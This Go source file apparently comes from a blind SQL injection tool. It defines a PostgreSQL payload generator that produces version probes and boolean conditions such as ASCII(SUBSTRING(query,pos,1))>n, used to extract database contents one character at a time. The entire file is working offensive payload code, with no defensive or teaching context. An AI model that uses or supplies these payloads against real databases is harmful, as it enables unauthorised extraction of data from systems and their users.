package payloads

import "fmt"

// PostgreSQLPayloads implements payloads for PostgreSQL
type PostgreSQLPayloads struct{}

func (p *PostgreSQLPayloads) GetType() DatabaseType {
	return PostgreSQL
}

func (p *PostgreSQLPayloads) GetName() string {
	return "PostgreSQL"
}

func (p *PostgreSQLPayloads) GetVersionQueries() []string {
	return []string{
		"SELECT version()",
		"SELECT current_setting('server_version')",
	}
}

func (p *PostgreSQLPayloads) GetLengthPayload(query string, n int) string {
	// LENGTH((query))>n - pure condition
	return fmt.Sprintf("LENGTH((%s))>%d", query, n)
}

func (p *PostgreSQLPayloads) GetComparisonPayload(query string, n int) string {
	// (query)>n - pure numeric comparison
	return fmt.Sprintf("(%s)>%d", query, n)
}

func (p *PostgreSQLPayloads) GetEqualityPayload(query string, pos int, charCode int) string {
	// ASCII(SUBSTRING((query),pos,1))=charCode
	return fmt.Sprintf("ASCII(SUBSTRING((%s),%d,1))=%d", query, pos, charCode)
}

func (p *PostgreSQLPayloads) GetCharPayload(query string, pos int, n int) string {
	// ASCII(SUBSTRING((query),pos,1))>n - pure condition
	return fmt.Sprintf("ASCII(SUBSTRING((%s),%d,1))>%d", query, pos, n)
}

func (p *PostgreSQLPayloads) GetSubstringFunc() string {
	return "SUBSTRING"
}

func (p *PostgreSQLPayloads) GetLengthFunc() string {
	return "LENGTH"
}

func (p *PostgreSQLPayloads) WrapCondition(condition string) string {
	return condition
}
